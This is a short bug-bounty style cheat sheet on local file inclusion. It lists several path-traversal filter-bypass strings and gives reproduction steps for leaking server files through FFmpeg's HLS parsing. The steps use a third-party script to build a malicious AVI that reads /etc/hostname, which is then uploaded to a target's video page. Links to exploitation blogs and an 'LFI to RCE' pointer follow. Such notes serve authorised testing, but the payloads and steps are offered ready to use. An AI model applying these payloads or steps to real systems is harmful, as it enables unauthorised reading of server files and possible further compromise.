## LFI

**Filter Bypass**

```
../\
```

```
..\/
```

```
/..
```

```
\/..
```

```
/%5c..
```

**FFmpeg Local File Disclosure**

This [script](https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py) by @neex can be used to disclose local files on FFmpeg hosts which parse externally-referencing [HLS playlists](https://ffmpeg.org/ffmpeg-formats.html#hls-2).

_Steps to reproduce_

1. Please download the script from @neex to your "attacker" instance
2. Execute the script with your desired parameters: `python3 gen_xbin_avi.py file:///etc/hostname bugbounty.avi`
3. Upload the generated AVI file to your target site (e.g. within a 'video upload page')
4. The target may process the malicious HLS inclusion with FFmpeg on the server-side.
5. Play the uploaded AVI via the target site. If successful, your desired file will be disclosed within the video.

Alternative scripts exist which may generate different HLS formats or lead to the desired file being disclosed in a different manner.

**Blogs**
* http://pastie.org/840199
* http://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/
* http://www.notsosecure.com/folder2/2010/08/20/lfi-code-exec-remote-root/?utm_source=twitterfeed&utm_medium=twitter
* http://labs.neohapsis.com/2008/07/21/local-file-inclusion-%E2%80%93-tricks-of-the-trade/
* http://www.digininja.org/blog/when_all_you_can_do_is_read.php

(**LFI to RCE**)[https://ibb.co/ntk0mR]
